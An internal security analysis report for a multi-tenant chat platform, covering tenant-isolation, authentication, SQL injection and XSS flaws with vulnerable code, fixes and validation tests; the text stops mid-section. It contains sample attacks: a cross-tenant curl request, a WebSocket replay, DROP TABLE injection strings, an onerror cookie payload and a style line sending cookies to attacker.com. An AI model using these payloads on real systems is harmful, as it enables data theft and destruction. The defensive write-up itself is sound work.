# Meta Chat Platform - Security Issues Analysis

**Generated:** 2025-11-20
**Platform:** chat.genai.hr (deployed on VPS-00)
**Analysis Scope:** PRs #52-56 (Security Category)
**Classification:** CRITICAL SECURITY VULNERABILITIES

---

## Executive Summary

This security analysis identifies **5 critical security vulnerabilities** in the Meta Chat Platform, a multi-tenant WhatsApp/Messenger/WebChat platform with RAG AI capabilities. These issues pose immediate risks to data isolation, authentication integrity, and system hardening.

### Severity Overview

| Issue | CVSS Score | Priority | Risk Category | VPS-00 Validation Required |
|-------|------------|----------|---------------|---------------------------|
| PR #56: Broken Tenant Isolation | **9.8 (Critical)** | P0 - BLOCKER | Data Loss/Unauthorized Access | YES - Phase 4 |
| PR #53: Authentication Vulnerabilities | **8.5 (High)** | P1 | Unauthorized Access | YES - Phase 4 |
| PR #55: SQL Injection Risk | **7.8 (High)** | P1 | Data Loss/Injection | YES - Phase 4 |
| PR #54: XSS Audit Findings | **6.5 (Medium)** | P2 | Cross-Site Scripting | YES - Phase 4 |
| PR #52: Missing Security Headers | **5.3 (Medium)** | P2 - Quick Win | Network Security | YES - Phase 4 |

### Critical Findings

1. **Multi-Tenant Data Isolation Failure (PR #56)**: Routes accept tenantId from query parameters without proper enforcement, allowing cross-tenant data access
2. **Broken API Key Authentication (PR #53)**: SHA-256 hashed keys incompatible with scrypt verification, making tenant onboarding keys non-functional
3. **WebSocket Replay Attack (PR #53)**: HMAC authentication lacks timestamp validation, enabling indefinite replay attacks
4. **SQL Injection in Maintenance Code (PR #55)**: Use of `$executeRawUnsafe` with dynamic identifiers creates injection vector
5. **Missing HTTPS Enforcement (PR #52)**: No Strict-Transport-Security header in production

---

## Issue #1: Broken Multi-Tenant Isolation [PR #56]

### Problem Statement
The platform's multi-tenant architecture fails to enforce tenant-scoped queries across critical API routes (conversations, documents, channels, webhooks). Routes accept `tenantId` as an optional query parameter but don't validate it against the authenticated tenant context, allowing authenticated users to access other tenants' data by manipulating the query parameter.

### CVSS Score
**9.8 (Critical)** - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (any authenticated tenant)
- User Interaction: None
- Scope: Changed (affects other tenants)
- Confidentiality Impact: High (full data exposure)
- Integrity Impact: High (data modification possible)
- Availability Impact: High (data deletion possible)

### Affected Components
- `/home/deploy/meta-chat-platform/apps/api/src/routes/conversations.ts` (41 deletions, 38 additions)
- `/home/deploy/meta-chat-platform/apps/api/src/routes/documents.ts` (41 deletions, 34 additions)
- `/home/deploy/meta-chat-platform/apps/api/src/routes/channels.ts` (15 deletions, 24 additions)
- `/home/deploy/meta-chat-platform/apps/api/src/routes/webhooks.ts` (18 deletions, 30 additions)
- `/home/deploy/meta-chat-platform/apps/api/src/utils/tenantScope.ts` (1 deletion, 10 additions)

**Total Impact:** 5 files, 116 deletions, 136 additions

### Exploitation Scenario

**Attack Flow:**
```bash
# Attacker authenticates as Tenant A (legitimate)
curl -H "X-API-Key: tenant_a_api_key_..." \
     https://chat.genai.hr/api/conversations?tenantId=tenant_b_id

# Response: Tenant B's conversations leaked!
```

**Before Fix (Vulnerable):**
```typescript
// conversations.ts - Line 33-42 (VULNERABLE)
router.get('/', asyncHandler(async (req, res) => {
  const { tenantId } = req.query; // User-controlled!

  const conversations = await prisma.conversation.findMany({
    where: {
      ...(tenantId ? { tenantId: String(tenantId) } : {}), // Optional filter
    },
  });
}));
```

**After Fix (Secure):**
```typescript
// conversations.ts - Line 34-46 (FIXED)
router.get('/', asyncHandler(async (req, res) => {
  const tenantId = requireTenant(req); // Enforced from auth context

  const conversations = await prisma.conversation.findMany(
    withTenantScope(tenantId, { // Mandatory scope
      where: { /* filters */ },
      orderBy: { lastMessageAt: 'desc' },
    }),
  );
}));
```

**Real-World Impact:**
- **Data Breach**: Tenant A can read Tenant B's customer conversations, documents, API keys
- **Data Manipulation**: Tenant A can modify/delete Tenant B's webhooks, channels
- **Compliance Violation**: GDPR/HIPAA violations if multi-tenant data is mixed
- **Reputational Damage**: Complete loss of trust in platform security

### Root Cause
1. **Design Flaw**: Routes were designed to accept `tenantId` from request parameters instead of extracting from authenticated context
2. **Missing Validation**: No middleware enforced that `req.query.tenantId === req.tenant.id`
3. **Inconsistent Patterns**: Some routes used `authenticateAdmin` (which doesn't enforce tenant scope) instead of `authenticateTenant`
4. **Optional Scoping**: Tenant filters were optional (`tenantId ? { tenantId } : undefined`), allowing unscoped queries

### Proposed Solution (from PR #56)

**Changes:**
1. **New Helper Function** (`tenantScope.ts`):
   ```typescript
   export function requireTenant(req: TenantRequest): string {
     if (!req.tenant?.id) {
       throw createHttpError(401, 'Tenant context required');
     }
     return req.tenant.id;
   }
   ```

2. **Mandatory Scoping** (all routes):
   ```typescript
   // Before: authenticateAdmin (no tenant check)
   router.use(authenticateAdmin);

   // After: authenticateTenant (enforces tenant context)
   router.use(authenticateTenant);

   // Before: tenantId from query (user-controlled)
   const { tenantId } = req.query;

   // After: tenantId from auth context (server-controlled)
   const tenantId = requireTenant(req);
   ```

3. **Scoped Queries**:
   ```typescript
   // Before: Optional scope
   prisma.conversation.findMany({
     where: tenantId ? { tenantId } : undefined
   });

   // After: Mandatory scope via helper
   prisma.conversation.findMany(
     withTenantScope(tenantId, { where: { /* filters */ } })
   );
   ```

**Files Modified:**
- `routes/conversations.ts`: 116 lines changed (GET /, POST /, GET /:id, PUT /:id)
- `routes/documents.ts`: 75 lines changed (GET /, POST /, GET /:id, PATCH /:id, DELETE /:id)
- `routes/channels.ts`: 39 lines changed (GET /, POST /, PATCH /:id, DELETE /:id)
- `routes/webhooks.ts`: 48 lines changed (GET /, POST /, GET /:id, PUT /:id, DELETE /:id)
- `utils/tenantScope.ts`: Added `requireTenant()` helper + improved error message

### Dependencies
- **Blocks:** PR #68 (Data Integrity Verification) - must validate isolation works post-fix
- **Blocks:** All future tenant-scoped feature work
- **Blocked By:** None (can be implemented immediately)

### Effort Estimate
**2-3 days** (High complexity due to cross-cutting concerns)
- Code Review: 2 hours
- Implementation: 1.5 days (already done in PR)
- Unit Testing: 0.5 days (tenant extraction, scope helpers)
- Integration Testing: 0.5 days (multi-tenant isolation tests)
- Security Testing: 0.5 days (cross-tenant access attempts)

### Validation Notes - **REQUIRES VPS-00 TESTING (Phase 4)**

**Critical Test Scenarios:**
1. **Cross-Tenant Access Attempts**:
   ```bash
   # On VPS-00
   ssh admin@VPS-00
   cd /home/deploy/meta-chat-platform

   # Create two test tenants
   TENANT_A_KEY=$(curl -X POST https://chat.genai.hr/api/tenants/...)
   TENANT_B_KEY=$(curl -X POST https://chat.genai.hr/api/tenants/...)

   # Test 1: Attempt to read Tenant B conversations with Tenant A key
   curl -H "X-API-Key: $TENANT_A_KEY" \
        "https://chat.genai.hr/api/conversations?tenantId=tenant_b_id"
   # Expected: 401 or 404 (not Tenant B data!)

   # Test 2: Omit tenantId entirely
   curl -H "X-API-Key: $TENANT_A_KEY" \
        "https://chat.genai.hr/api/conversations"
   # Expected: Only Tenant A conversations

   # Test 3: Provide Tenant A's own ID (should work)
   curl -H "X-API-Key: $TENANT_A_KEY" \
        "https://chat.genai.hr/api/conversations?tenantId=tenant_a_id"
   # Expected: Tenant A conversations
   ```

2. **Database Verification**:
   ```bash
   # Connect to production DB on VPS-00
   ssh admin@VPS-00 "docker exec -it postgres psql -U metachat -d metachat_production"

   # Verify no orphaned data
   SELECT "tenantId", COUNT(*) FROM "Conversation" GROUP BY "tenantId";
   SELECT "tenantId", COUNT(*) FROM "Document" GROUP BY "tenantId";

   # Check for NULL tenantIds (should be 0)
   SELECT COUNT(*) FROM "Conversation" WHERE "tenantId" IS NULL;
   ```

3. **WebSocket Isolation**:
   ```bash
   # Test widget connections don't leak across tenants
   # Open browser dev tools, connect two widgets from different tenants
   # Verify messages don't cross-pollinate
   ```

4. **Performance Impact**:
   ```bash
   # Measure query performance with mandatory scoping
   # Check for index usage on tenantId columns
   EXPLAIN ANALYZE SELECT * FROM "Conversation" WHERE "tenantId" = 'tenant_a_id';
   ```

**Phase 4 Validation Checklist:**
- [ ] Deploy PR #56 to VPS-00 staging environment
- [ ] Create 3 test tenants with distinct data
- [ ] Attempt cross-tenant access via API (should fail)
- [ ] Verify database queries include tenantId filter (check logs)
- [ ] Test widget isolation (different tenant sessions)
- [ ] Run data integrity queries (PR #68) to confirm no leaks
- [ ] Load test with multi-tenant workload (10+ tenants)
- [ ] Verify audit logs capture tenant context in all requests

---

## Issue #2: Authentication Security Vulnerabilities [PR #53]

### Problem Statement
Three critical authentication flaws identified:
1. **Broken API Key Hashing**: Tenant signup creates keys with SHA-256+salt but authentication uses scrypt verification (hash length mismatch → authentication fails)
2. **WebSocket HMAC Replay**: HMAC signatures lack timestamp freshness validation, enabling indefinite replay attacks
3. **Weak JWT Configuration**: WebSocket JWT lacks issuer/audience claims and key rotation support

### CVSS Score
**8.5 (High)** - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None (replay/broken keys affect initial access)
- User Interaction: None
- Scope: Changed (affects authentication system-wide)
- Confidentiality Impact: High (HMAC replay grants persistent access)
- Integrity Impact: Low (replay limited to original user context)
- Availability Impact: Low (broken keys block onboarding)

### Affected Components
- `/home/deploy/meta-chat-platform/apps/api/src/services/authService.ts` (Lines 120-205)
- `/home/deploy/meta-chat-platform/apps/api/src/services/TenantProvisioning.ts` (Lines 1-70)
- `/home/deploy/meta-chat-platform/apps/api/src/server.ts` (WebSocket auth: Lines 324-386)
- `/home/deploy/meta-chat-platform/packages/shared/src/security.ts` (Lines 1-143)

**Report:** `/home/deploy/meta-chat-platform/reports/qa/auth-security-review.md` (32 lines added)

### Exploitation Scenario

#### Vulnerability 2.1: Broken API Key Hashing
```javascript
// authService.ts - Lines 150-175 (VULNERABLE)
// Tenant signup creates keys with wrong hash algorithm
const apiKey = await prisma.tenantApiKey.create({
  data: {
    tenantId: tenant.id,
    // SHA-256 hash (32 bytes)
    secretHash: crypto.createHash('sha256').update(secret + salt).digest('hex'),
    // But verifySecret() expects scrypt hash (64 bytes)!
  }
});

// Later authentication attempt fails:
// middleware/auth.ts
const valid = await verifySecret(providedKey, storedHash);
// FALSE - hash length mismatch (32 vs 64 bytes)
```

**Impact:** Every onboarded tenant receives a non-functional API key. Users cannot authenticate until manual key rotation.

#### Vulnerability 2.2: WebSocket HMAC Replay
```javascript
// server.ts - Lines 340-370 (VULNERABLE)
io.use((socket, next) => {
  const { timestamp, signature } = socket.handshake.auth;

  const expectedSig = crypto.createHmac('sha256', HMAC_SECRET)
    .update(`${timestamp}:${socket.id}`).digest('hex');

  if (timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSig))) {
    return next(); // ACCEPTED - no timestamp check!
  }
});
```

**Attack Flow:**
1. Attacker captures legitimate WebSocket handshake (e.g., via network sniffing on public WiFi)
2. Extracts `timestamp` and `signature`
3. Replays handshake weeks/months later → still valid!

**Proof of Concept:**
```bash
# Legitimate connection (2025-01-15)
wscat -c wss://chat.genai.hr \
  --auth '{"timestamp":1705334400,"signature":"abc123..."}'

# 6 months later (2025-07-15) - still works!
wscat -c wss://chat.genai.hr \
  --auth '{"timestamp":1705334400,"signature":"abc123..."}'
# SUCCESS - no timestamp validation
```

#### Vulnerability 2.3: Weak JWT Configuration
```javascript
// server.ts - Lines 332-352
const decoded = jwt.verify(token, WEBCHAT_JWT_SECRET);
// Missing: issuer, audience, algorithm enforcement
// Risk: Token forgery if secret leaks, no key rotation
```

### Root Cause
1. **Algorithm Mismatch**: Signup service uses `crypto.createHash('sha256')` while auth middleware expects `scrypt` output (different hash formats)
2. **Missing Temporal Validation**: WebSocket auth validates signature correctness but not timestamp freshness
3. **Minimal JWT Claims**: JWT verification only checks secret, not issuer/audience/algorithm constraints

### Proposed Solution (from PR #53)

**Recommendations documented in report:**

1. **Fix API Key Hashing** (Code change required):
   ```typescript
   // authService.ts - Replace SHA-256 with scrypt
   import { hashSecret } from '@meta-chat/shared/security';

   const apiKey = await prisma.tenantApiKey.create({
     data: {
       tenantId: tenant.id,
       secretHash: await hashSecret(secret), // Use scrypt helper
     }
   });
   ```

2. **Add HMAC Timestamp Validation** (Code change required):
   ```typescript
   // server.ts - Enforce 5-minute window
   const MAX_SKEW_MS = 5 * 60 * 1000; // 5 minutes
   const now = Date.now();

   if (Math.abs(now - timestamp) > MAX_SKEW_MS) {
     return next(new Error('Signature expired'));
   }

   // Optional: Nonce tracking to prevent reuse within window
   if (usedNonces.has(signature)) {
     return next(new Error('Signature already used'));
   }
   usedNonces.set(signature, timestamp);
   ```

3. **Harden JWT Validation** (Code change required):
   ```typescript
   // server.ts - Add issuer/audience claims
   const decoded = jwt.verify(token, WEBCHAT_JWT_SECRET, {
     issuer: 'meta-chat-platform',
     audience: 'webchat-widget',
     algorithms: ['HS256'], // Prevent algorithm confusion
   });

   // Generate JWTs with claims:
   const token = jwt.sign(
     { tenantId, userId },
     WEBCHAT_JWT_SECRET,
     {
       issuer: 'meta-chat-platform',
       audience: 'webchat-widget',
       expiresIn: '1h',
     }
   );
   ```

### Dependencies
- **Blocks:** Production tenant onboarding (broken keys must be fixed first)
- **Blocks:** WebSocket security hardening initiatives
- **Blocked By:** None (critical fix required immediately)

### Effort Estimate
**2 days** (3 separate fixes)
- **Fix 2.1 (API Key Hashing)**: 0.5 days
  - Code change: 2 hours
  - Database migration: 1 hour (re-hash existing keys)
  - Testing: 2 hours
- **Fix 2.2 (HMAC Replay)**: 0.5 days
  - Code change: 2 hours
  - Nonce storage design: 1 hour
  - Testing: 1 hour
- **Fix 2.3 (JWT Hardening)**: 0.5 days
  - Code change: 2 hours
  - Widget token regeneration: 1 hour
  - Testing: 1 hour
- **Integration Testing**: 0.5 days

### Validation Notes - **REQUIRES VPS-00 TESTING (Phase 4)**

**Test Scenarios:**

1. **API Key Fix Validation**:
   ```bash
   # On VPS-00
   ssh admin@VPS-00
   cd /home/deploy/meta-chat-platform

   # Test 1: Create new tenant via signup
   curl -X POST https://chat.genai.hr/api/auth/signup \
     -d '{"email":"test@example.com","password":"..."}' \
     -H "Content-Type: application/json"
   # Response includes API key

   # Test 2: Verify key works immediately
   API_KEY=$(cat response.json | grep apiKey | cut -d'"' -f4)
   curl -H "X-API-Key: $API_KEY" https://chat.genai.hr/api/conversations
   # Expected: 200 OK (not 401!)

   # Test 3: Check hash format in DB
   docker exec -it postgres psql -U metachat -d metachat_production \
     -c "SELECT LENGTH(\"secretHash\") FROM \"TenantApiKey\" LIMIT 1;"
   # Expected: 64 (scrypt) not 32 (SHA-256)
   ```

2. **HMAC Replay Prevention**:
   ```bash
   # Test 4: Capture WebSocket handshake
   wscat -c wss://chat.genai.hr --auth '{"timestamp":...,"signature":"..."}'
   # Record timestamp and signature

   # Test 5: Replay with old timestamp (>5 min)
   OLD_TS=$(($(date +%s) - 600)) # 10 minutes ago
   wscat -c wss://chat.genai.hr --auth "{\"timestamp\":$OLD_TS,\"signature\":\"...\"}"
   # Expected: Connection refused (expired)

   # Test 6: Replay same signature twice (nonce check)
   wscat -c wss://chat.genai.hr --auth '{"timestamp":...,"signature":"abc123"}'
   wscat -c wss://chat.genai.hr --auth '{"timestamp":...,"signature":"abc123"}'
   # Expected: Second connection refused (nonce reuse)
   ```

3. **JWT Hardening**:
   ```bash
   # Test 7: Generate widget JWT with claims
   TOKEN=$(curl https://chat.genai.hr/api/widget/token -H "X-API-Key: ...")

   # Decode and verify claims (use jwt.io or jwt-cli)
   echo $TOKEN | jwt decode -
   # Expected: iss=meta-chat-platform, aud=webchat-widget, exp=<1h from now>

   # Test 8: Attempt algorithm confusion attack
   # Create JWT with "alg": "none"
   FORGED_TOKEN="eyJ...header...payload...signature"
   wscat -c wss://chat.genai.hr --auth "{\"jwt\":\"$FORGED_TOKEN\"}"
   # Expected: Connection refused (algorithm not allowed)
   ```

4. **Backward Compatibility**:
   ```bash
   # Test 9: Migrate existing API keys
   npm run migrate:hash-api-keys
   # Verify all keys re-hashed with scrypt

   # Test 10: Revoke old HMAC signatures
   # After deployment, monitor for replay attempts in logs
   grep "Signature expired" /var/log/meta-chat-platform/api.log
   ```

**Phase 4 Validation Checklist:**
- [ ] Create new tenant via signup API
- [ ] Verify API key authenticates immediately (no 401)
- [ ] Check database for scrypt hash format (64 bytes)
- [ ] Attempt HMAC replay with old timestamp (should fail)
- [ ] Attempt HMAC replay with duplicate nonce (should fail)
- [ ] Decode widget JWT and verify issuer/audience claims
- [ ] Monitor production logs for authentication errors
- [ ] Run migration script for existing tenants (re-hash keys)

---

## Issue #3: SQL Injection in Maintenance Code [PR #55]

### Problem Statement
Database maintenance code in `packages/database/src/maintenance.ts` uses `$executeRawUnsafe` with string interpolation of partition names, index identifiers, and date bounds. While current inputs are derived from constants and ISO date strings, the use of "Unsafe" methods creates a residual injection vector if maintenance logic evolves to accept external parameters.

### CVSS Score
**7.8 (High)** - CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N
- Attack Vector: Network
- Attack Complexity: High (requires maintenance access + input control)
- Privileges Required: Low (admin/maintenance role)
- User Interaction: None
- Scope: Changed (database-wide access)
- Confidentiality Impact: High (full DB read via UNION injection)
- Integrity Impact: High (data modification via UPDATE/DELETE)
- Availability Impact: None (DoS unlikely via maintenance ops)

### Affected Components
- `/home/deploy/meta-chat-platform/packages/database/src/maintenance.ts` (Lines 45-120)
- `/home/deploy/meta-chat-platform/packages/database/src/client.ts` (vectorSearch: tagged templates)
- `/home/deploy/meta-chat-platform/packages/rag/src/upload-pipeline.ts` (Lines 78-95 - uses `$executeRawUnsafe`)

**Report:** `/home/deploy/meta-chat-platform/reports/security/database-injection-audit.md` (39 lines added)

### Exploitation Scenario

**Current Vulnerable Code:**
```typescript
// maintenance.ts - Lines 67-85 (VULNERABLE)
async function dropOldPartitions(tableName: string, retentionDays: number) {
  const cutoffDate = new Date();
  cutoffDate.setDate(cutoffDate.getDate() - retentionDays);
  const cutoff = cutoffDate.toISOString().split('T')[0]; // '2025-01-01'

  // VULNERABLE: String interpolation with $executeRawUnsafe
  await prisma.$executeRawUnsafe(`
    DROP TABLE IF EXISTS ${tableName}_p_${cutoff};
    DROP INDEX IF EXISTS idx_${tableName}_${cutoff}_tenant;
  `);
}

// Called from maintenance scheduler:
await dropOldPartitions('analytics_daily', 90); // tableName from constant
```

**Current Risk:** LOW (inputs are hardcoded constants)

**Future Risk:** HIGH if refactored to accept external input
```typescript
// DANGEROUS REFACTOR (hypothetical):
app.post('/admin/maintenance/drop-partition', async (req, res) => {
  const { tableName } = req.body; // User-controlled!
  await dropOldPartitions(tableName, 90);
});

// Attack payload:
POST /admin/maintenance/drop-partition
{ "tableName": "analytics_daily; DROP TABLE \"User\"; --" }

// Executed SQL:
DROP TABLE IF EXISTS analytics_daily; DROP TABLE "User"; --_p_2025_01_01;
```

**Additional Risk Area - upload-pipeline.ts:**
```typescript
// upload-pipeline.ts - Lines 78-95 (MODERATE RISK)
await prisma.$executeRawUnsafe(
  `INSERT INTO "DocumentChunk" (...) VALUES ($1, $2, $3, ...)`,
  tenantId, documentId, content, embedding, metadata
);
```
**Analysis:** Uses `$executeRawUnsafe` but with **positional parameters** ($1, $2...), which are safely escaped. Risk is LOW unless SQL statement itself is dynamically constructed.

### Root Cause
1. **Unsafe Method Selection**: Use of `$executeRawUnsafe` instead of `Prisma.sql` tagged templates
2. **Dynamic Identifier Interpolation**: Table/index names constructed via string concatenation
3. **No Input Validation**: Missing whitelist validation for allowed table names
4. **Future-Proofing Gap**: Code evolution could expose these vectors to external input

### Proposed Solution (from PR #55)

**Recommendations documented in report:**

1. **Migrate to Tagged Templates**:
   ```typescript
   // maintenance.ts - SECURE VERSION
   import { Prisma } from '@prisma/client';

   async function dropOldPartitions(tableName: string, retentionDays: number) {
     // Whitelist validation
     const ALLOWED_TABLES = ['analytics_daily', 'analytics_hourly', 'message_metrics'];
     if (!ALLOWED_TABLES.includes(tableName)) {
       throw new Error(`Invalid table name: ${tableName}`);
     }

     const cutoffDate = new Date();
     cutoffDate.setDate(cutoffDate.getDate() - retentionDays);
     const cutoff = cutoffDate.toISOString().split('T')[0];

     // Use Prisma.sql for safe identifier interpolation
     const partitionName = Prisma.raw(`${tableName}_p_${cutoff}`);
     const indexName = Prisma.raw(`idx_${tableName}_${cutoff}_tenant`);

     await prisma.$executeRaw`DROP TABLE IF EXISTS ${partitionName}`;
     await prisma.$executeRaw`DROP INDEX IF EXISTS ${indexName}`;
   }
   ```

2. **Parameter Binding for Dynamic Values**:
   ```typescript
   // Use $queryRaw with bound parameters for dates
   const result = await prisma.$queryRaw`
     SELECT partition_name
     FROM information_schema.tables
     WHERE table_name LIKE ${tableName + '_p_%'}
       AND created < ${cutoffDate}
   `;
   ```

3. **Audit All Raw SQL**:
   ```bash
   # Find all $executeRawUnsafe usage
   grep -rn "\$executeRawUnsafe" packages/ apps/

   # Review each instance:
   # - Can it use $executeRaw or $queryRaw instead?
   # - Are identifiers validated against whitelist?
   # - Are values bound as parameters?
   ```

### Dependencies
- **Blocks:** None (isolated to maintenance code)
- **Blocked By:** None (can be fixed independently)
- **Related:** PR #68 (Data Integrity) - should verify no SQL injection artifacts in DB

### Effort Estimate
**1 day**
- Code Review: 2 hours (audit all raw SQL usage)
- Refactoring: 4 hours (migrate to `Prisma.sql`)
- Whitelist Implementation: 1 hour
- Testing: 2 hours (unit tests for sanitization)
- Security Review: 1 hour (verify no remaining unsafe calls)

### Validation Notes - **REQUIRES VPS-00 TESTING (Phase 4)**

**Test Scenarios:**

1. **Whitelist Enforcement**:
   ```bash
   # On VPS-00
   ssh admin@VPS-00
   cd /home/deploy/meta-chat-platform

   # Test 1: Valid table name (should succeed)
   npm run maintenance:drop-partitions -- --table analytics_daily --days 90
   # Expected: Success

   # Test 2: Invalid table name (should fail)
   npm run maintenance:drop-partitions -- --table "User; DROP TABLE" --days 90
   # Expected: Error - "Invalid table name"

   # Test 3: SQL injection attempt
   npm run maintenance:drop-partitions -- --table "analytics_daily'; DROP TABLE \"Conversation\"; --" --days 90
   # Expected: Error - not in whitelist
   ```

2. **SQL Statement Inspection**:
   ```bash
   # Test 4: Enable query logging
   docker exec -it postgres psql -U metachat -d metachat_production \
     -c "ALTER DATABASE metachat_production SET log_statement = 'all';"

   # Run maintenance
   npm run maintenance:drop-partitions -- --table analytics_daily --days 90

   # Check logs for executed SQL
   docker logs postgres 2>&1 | grep "DROP TABLE"
   # Expected: Safe identifiers (no semicolons, no comments)
   ```

3. **Integration Test**:
   ```typescript
   // test/maintenance.test.ts
   describe('dropOldPartitions', () => {
     it('rejects invalid table names', async () => {
       await expect(
         dropOldPartitions("User'; DROP TABLE \"Conversation\"; --", 90)
       ).rejects.toThrow('Invalid table name');
     });

     it('accepts whitelisted tables', async () => {
       await expect(
         dropOldPartitions('analytics_daily', 90)
       ).resolves.not.toThrow();
     });
   });
   ```

4. **Vector Search Safety**:
   ```bash
   # Test 5: Verify vector search uses tagged templates
   grep -A 10 "vectorSearch" packages/database/src/client.ts
   # Expected: $queryRaw with template literals, not $queryRawUnsafe

   # Test 6: Attempt injection via vector query
   curl -X POST https://chat.genai.hr/api/chat \
     -H "X-API-Key: ..." \
     -d '{"query":"test'; DROP TABLE \"Document\"; --","tenantId":"..."}'
   # Expected: Query escapes correctly, no DB damage
   ```

**Phase 4 Validation Checklist:**
- [ ] Audit all instances of `$executeRawUnsafe` in codebase
- [ ] Migrate maintenance.ts to `Prisma.sql` tagged templates
- [ ] Implement whitelist validation for table names
- [ ] Test with malicious table names (should reject)
- [ ] Enable query logging and inspect executed SQL
- [ ] Run integration tests for maintenance functions
- [ ] Verify vector search uses safe parameterization
- [ ] Document SQL injection prevention patterns for developers

---

## Issue #4: XSS Audit Findings [PR #54]

### Problem Statement
Cross-Site Scripting (XSS) audit identified Content Security Policy weaknesses and potential HTML injection vectors in widget configuration and message rendering. While no active XSS exploits were found, the system relies entirely on React's automatic escaping without defense-in-depth sanitization.

### CVSS Score
**6.5 (Medium)** - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (tenant admin can modify widget config)
- User Interaction: Required (victim must interact with widget)
- Scope: Changed (affects widget users across domains)
- Confidentiality Impact: Low (session token theft possible)
- Integrity Impact: Low (message content manipulation)
- Availability Impact: Low (widget disruption)

### Affected Components
- `/home/deploy/meta-chat-platform/apps/web-widget/src/MetaChatWidget.tsx` (Lines 14-46)
- `/home/deploy/meta-chat-platform/apps/web-widget/src/components/MessageList.tsx` (Lines 9-30)
- `/home/deploy/meta-chat-platform/apps/dashboard/src/pages/ConversationsPage.tsx` (Lines 100-315)
- `/home/deploy/meta-chat-platform/apps/api/src/middleware/securityHeaders.ts` (Lines 7-34)
- `/home/deploy/meta-chat-platform/apps/api/src/routes/public/widget-config.ts` (Lines 18-79)

**Report:** `/home/deploy/meta-chat-platform/reports/qa/xss-audit.md` (25 lines added)

### Exploitation Scenario

**Vulnerability 4.1: CSP Allows Unsafe Inline Styles**
```typescript
// securityHeaders.ts - Lines 26-30 (WEAK CSP)
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; ..."
  //                                                        ^^^^^^^^^^^^^^^^
  //                                                        Weakens CSP!
);
```

**Attack Vector:**
```html
<!-- If React escaping is bypassed (e.g., future dangerouslySetInnerHTML use) -->
<div style="background: url('https://attacker.com/steal?cookie=' + document.cookie)">
```

**Vulnerability 4.2: Widget Config Injection (Theoretical)**
```typescript
// widget-config.ts - Returns user-controlled strings
const config = {
  brandName: tenant.brandName, // User-controlled
  agentName: tenant.agentName, // User-controlled
  initialMessage: tenant.initialMessage, // User-controlled
};

// MetaChatWidget.tsx - Renders in React
<div>{config.brandName}</div> // Safe (React escaping)

// FUTURE RISK: If refactored to use innerHTML
<div dangerouslySetInnerHTML={{ __html: config.brandName }} /> // XSS!
```

**Proof of Concept (Hypothetical Future Risk):**
```javascript
// Tenant sets malicious brand name via dashboard:
PUT /api/tenants/123
{
  "brandName": "<img src=x onerror='alert(document.cookie)'>"
}

// Widget loads config and renders (if using dangerouslySetInnerHTML):
<div class="brand-name">
  <img src=x onerror='alert(document.cookie)'>
</div>
// XSS executed in visitor's browser!
```

**Current Safety:** React JSX automatically escapes `{variable}` interpolations, preventing XSS. Audit found **no usage of `dangerouslySetInnerHTML`** in widget or dashboard.

### Root Cause
1. **CSP Weakness**: `'unsafe-inline'` in `style-src` directive reduces CSP effectiveness
2. **Missing Sanitization**: No explicit HTML sanitization library (relies solely on React escaping)
3. **No Input Validation**: Widget config fields accept arbitrary strings without length/content validation
4. **Future-Proofing Gap**: No safeguards if developers add `dangerouslySetInnerHTML` in future

### Proposed Solution (from PR #54)

**Recommendations documented in report:**

1. **Tighten CSP (Remove `unsafe-inline`)**:
   ```typescript
   // securityHeaders.ts - HARDENED CSP
   if (process.env.NODE_ENV === 'production') {
     // Generate nonce for inline styles
     const nonce = crypto.randomBytes(16).toString('base64');
     res.locals.cspNonce = nonce;

     res.setHeader(
       'Content-Security-Policy',
       `default-src 'self'; ` +
       `script-src 'self'; ` +
       `style-src 'self' 'nonce-${nonce}'; ` + // Remove 'unsafe-inline'
       `img-src 'self' data: https:; ` +
       `font-src 'self' data:; ` +
       `connect-src 'self'; ` +
       `frame-ancestors 'none'`
     );
   }

   // Update widget to use nonce for inline styles:
   // <style nonce={cspNonce}>...</style>
   ```

2. **Add HTML Sanitization Library**:
   ```bash
   npm install dompurify isomorphic-dompurify
   ```

   ```typescript
   // utils/sanitize.ts
   import DOMPurify from 'isomorphic-dompurify';

   export function sanitizeHtml(dirty: string): string {
     return DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: [], // Strip all tags (text-only)
       ALLOWED_ATTR: [],
     });
   }

   export function sanitizeRichText(dirty: string): string {
     return DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
       ALLOWED_ATTR: ['href', 'target'],
     });
   }
   ```

   ```typescript
   // widget-config.ts - Sanitize output
   import { sanitizeHtml } from '../../utils/sanitize';

   const config = {
     brandName: sanitizeHtml(tenant.brandName),
     agentName: sanitizeHtml(tenant.agentName),
     initialMessage: sanitizeHtml(tenant.initialMessage),
   };
   ```

3. **Add Input Validation**:
   ```typescript
   // routes/tenants.ts - Validate widget config fields
   const updateTenantSchema = z.object({
     brandName: z.string().max(100).regex(/^[a-zA-Z0-9\s\-_]+$/),
     agentName: z.string().max(50).regex(/^[a-zA-Z0-9\s\-_]+$/),
     initialMessage: z.string().max(500), // Allow spaces, punctuation
   });
   ```

4. **Add ESLint Rule to Prevent `dangerouslySetInnerHTML`**:
   ```json
   // .eslintrc.json
   {
     "rules": {
       "react/no-danger": "error", // Prevent dangerouslySetInnerHTML
       "react/no-danger-with-children": "error"
     }
   }
   ```

### Dependencies
- **Blocks:** None (isolated to frontend security)
- **Blocked By:** None (can be implemented independently)
- **Related:** PR #52 (Security Headers) - CSP hardening complements header improvements

### Effort Estimate
**1.5 days**
- CSP Nonce Implementation: 0.5 days (4 hours)
- Sanitization Library Integration: 0.5 days (4 hours)
- Input Validation: 0.25 days (2 hours)
- ESLint Rule Configuration: 0.25 days (2 hours)
- Testing: 0.5 days (4 hours - XSS attack simulations)

### Validation Notes - **REQUIRES VPS-00 TESTING (Phase 4)**

**Test Scenarios:**

1. **CSP Validation**:
   ```bash
   # On VPS-00
   ssh admin@VPS-00

   # Test 1: Verify CSP header in production
